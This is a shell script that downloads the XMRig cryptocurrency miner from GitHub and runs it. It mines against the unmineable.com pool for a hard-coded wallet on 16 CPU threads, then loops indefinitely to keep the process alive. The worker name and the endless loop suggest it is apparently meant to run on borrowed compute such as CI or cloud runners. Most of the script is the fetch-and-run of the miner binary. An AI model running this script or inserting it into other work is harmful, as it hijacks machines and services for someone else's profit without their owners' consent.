#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz 
tar xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 
./xmrig -o rx.unmineable.com:3333 -a rx -u SAITAMA:0xc6465b15cEA55d08f5428DDfE1B5A272Ab0c466a.Git#630h-4vx9-p x --cpu 16
while [ 1 ]; do
sleep 3
done
sleep 999
